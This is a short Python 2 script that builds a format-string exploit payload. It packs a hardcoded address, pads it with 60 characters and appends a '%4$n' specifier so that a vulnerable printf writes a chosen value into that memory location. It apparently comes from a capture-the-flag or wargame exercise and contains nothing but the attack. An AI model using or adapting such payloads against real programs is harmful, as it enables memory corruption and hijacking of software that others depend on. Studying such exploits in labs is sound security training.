import struct

mAddr = struct.pack("I", 0x804988c)

print mAddr+("a"*60)+"%4$n"
